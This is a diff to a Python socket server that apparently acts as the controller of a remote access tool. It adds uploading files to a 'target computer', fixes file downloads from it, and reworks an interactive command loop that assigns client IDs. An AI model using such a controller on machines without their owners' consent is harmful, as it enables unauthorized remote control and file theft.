@@ -13,6 +13,22 @@ clients = 0
 i = 0
 
 
+# a function for uploading a file to the target computer
+def HandleUpload(file_path, con):
+    try:
+        file = open(file_path[2], "rb").read()
+        message = f"CID {file_path[0]} file_accept: {file_path[2]}"
+        con.send(message.encode())
+        time.sleep(1)
+        print("uploading file to target...")
+        con.send(file)
+        response = con.recv(1024)
+        print(response.decode("utf-8"))
+    except FileNotFoundError:
+        print(f"{file_path[2]} does not exist, double check your path and spelling.\n")
+
+
+# a function for downloading files from the target computer
 def HandleDownload(data, con):
     """
     function that handles downloading files from the client
@@ -34,9 +50,9 @@ def HandleDownload(data, con):
         data = con.recv(4096)
         if data.__contains__(b"file:"):
             print("file download finished...\n moving on to next file")
-            HandleDownload(data, con)
             file.write(buffer)
             file.close()
+            HandleDownload(data, con)
             break
         if not data:
             print("download finished.")
@@ -46,6 +62,7 @@ def HandleDownload(data, con):
         buffer += data
 
 
+# handeling of the different commands
 def HandleCommand(command, con):
     """
     Handeling commands sent by the user to the client and their response
@@ -81,6 +98,13 @@ def HandleCommand(command, con):
         else:
             HandleDownload(response, con)
 
+    if command.lower().__contains__("upload"):
+        file_path = command.split(" ")
+        HandleUpload(file_path, con)
+
+    else:
+        pass
+
 
 try:
     while True:
@@ -92,13 +116,19 @@ try:
             if response == b"CID_req":
                 con.send(f"CID {str(clients)}".encode())
                 clients += 1
+            elif not response:
+                command = input(">>>")
+                if command == "":
+                    continue
+                HandleCommand(command, con)
             else:
                 print(response.decode("utf-8"))
 
-        command = input(">>>")
-        if command is False:
-            continue
-        HandleCommand(command, con)
+            command = input(">>>")
+            if command == "":
+                continue
+            HandleCommand(command, con)
+
 
 except KeyboardInterrupt:
     print("Interrupt recieved, exiting.\n")
